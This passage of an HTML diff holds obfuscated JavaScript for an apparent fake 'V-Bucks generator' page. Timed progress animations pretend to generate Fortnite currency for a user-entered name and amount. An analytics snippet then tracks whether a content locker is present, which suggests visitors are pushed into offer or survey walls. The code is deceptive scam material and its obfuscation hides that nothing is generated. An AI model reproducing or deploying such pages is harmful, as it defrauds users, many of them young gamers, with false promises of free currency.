_0xa8ad5e=_0x545aa5;vbucksValue2=_0x350bee,document[_0xa8ad5e(0x13a)](_0xa8ad5e(0x14c))[_0xa8ad5e(0x126)][_0xa8ad5e(0x12e)](_0xa8ad5e(0x13e)),document[_0xa8ad5e(0x13a)](_0xa8ad5e(0x133))[_0xa8ad5e(0x126)][_0xa8ad5e(0x12e)]('VBucks1'),document[_0xa8ad5e(0x13a)](_0xa8ad5e(0x148))['classList'][_0xa8ad5e(0x12e)](_0xa8ad5e(0x13e)),document[_0xa8ad5e(0x13a)]('VBucks00')['classList'][_0xa8ad5e(0x13f)](_0xa8ad5e(0x13d)),document[_0xa8ad5e(0x13a)](_0xa8ad5e(0x133))[_0xa8ad5e(0x126)][_0xa8ad5e(0x13f)](_0xa8ad5e(0x13d)),document[_0xa8ad5e(0x13a)](_0xa8ad5e(0x148))[_0xa8ad5e(0x126)][_0xa8ad5e(0x13f)](_0xa8ad5e(0x13d)),document[_0xa8ad5e(0x13a)](_0x47b1e6)['classList']['add'](_0xa8ad5e(0x13d)),document[_0xa8ad5e(0x13a)](_0x47b1e6)[_0xa8ad5e(0x126)]['remove'](_0xa8ad5e(0x13e));}function _0x8f8e(_0x9ce9d9,_0x16b450){var _0x551815=_0x5518();return _0x8f8e=function(_0x8f8ecc,_0xf964ae){_0x8f8ecc=_0x8f8ecc-0x115;var _0x1ae827=_0x551815[_0x8f8ecc];return _0x1ae827;},_0x8f8e(_0x9ce9d9,_0x16b450);}function GenerateButton(){var _0x53f3d9=_0x545aa5;document['getElementById'](_0x53f3d9(0x144))[_0x53f3d9(0x145)][_0x53f3d9(0x14e)]=_0x53f3d9(0x11b),document[_0x53f3d9(0x13a)](_0x53f3d9(0x131))[_0x53f3d9(0x145)][_0x53f3d9(0x14e)]='none',document['getElementById'](_0x53f3d9(0x147))[_0x53f3d9(0x145)][_0x53f3d9(0x14e)]='block',setTimeout(function(){var _0x17fb08=_0x53f3d9;document[_0x17fb08(0x13a)]('progress-bar')[_0x17fb08(0x126)]['add'](_0x17fb08(0x152)),setTimeout(function(){var _0x27ab4d=_0x17fb08;document[_0x27ab4d(0x13a)]('Generating-step0')['innerHTML']=_0x27ab4d(0x130)+vbucksValue+_0x27ab4d(0x11e)+vbucksValue2+_0x27ab4d(0x122)+name+'',document[_0x27ab4d(0x13a)](_0x27ab4d(0x121))[_0x27ab4d(0x126)][_0x27ab4d(0x12e)](_0x27ab4d(0x11a)),setTimeout(function(){var _0x569ae3=_0x27ab4d;document[_0x569ae3(0x13a)](_0x569ae3(0x124))['innerHTML']=_0x569ae3(0x128),document[_0x569ae3(0x13a)]('progress-bar')[_0x569ae3(0x126)][_0x569ae3(0x12e)](_0x569ae3(0x14a)),setTimeout(function(){var _0xb81468=_0x569ae3;document[_0xb81468(0x13a)](_0xb81468(0x124))[_0xb81468(0x140)]=_0xb81468(0x127),document[_0xb81468(0x13a)](_0xb81468(0x121))[_0xb81468(0x126)][_0xb81468(0x12e)](_0xb81468(0x12d)),document[_0xb81468(0x13a)](_0xb81468(0x14f))['style'][_0xb81468(0x14e)]=_0xb81468(0x12c),setTimeout(function(){var _0x3734ff=_0xb81468;document[_0x3734ff(0x13a)](_0x3734ff(0x12f))[_0x3734ff(0x145)]['display']=_0x3734ff(0x11b),setTimeout(function(){var _0xf8efbb=_0x3734ff;document[_0xf8efbb(0x13a)](_0xf8efbb(0x115))[_0xf8efbb(0x145)][_0xf8efbb(0x14e)]=_0xf8efbb(0x153),document[_0xf8efbb(0x13a)](_0xf8efbb(0x150))[_0xf8efbb(0x140)]=vbucksValue,document['getElementById']('Name-LastStep')['innerHTML']=name,document[_0xf8efbb(0x13a)](_0xf8efbb(0x129))[_0xf8efbb(0x140)]=vbucksValue2;},0x64);},0xbb8);},0xbb8);},0x1388);},0xfa0);},0x3e8);}
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-249914150-1', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+</script>
+</body>
+</html>
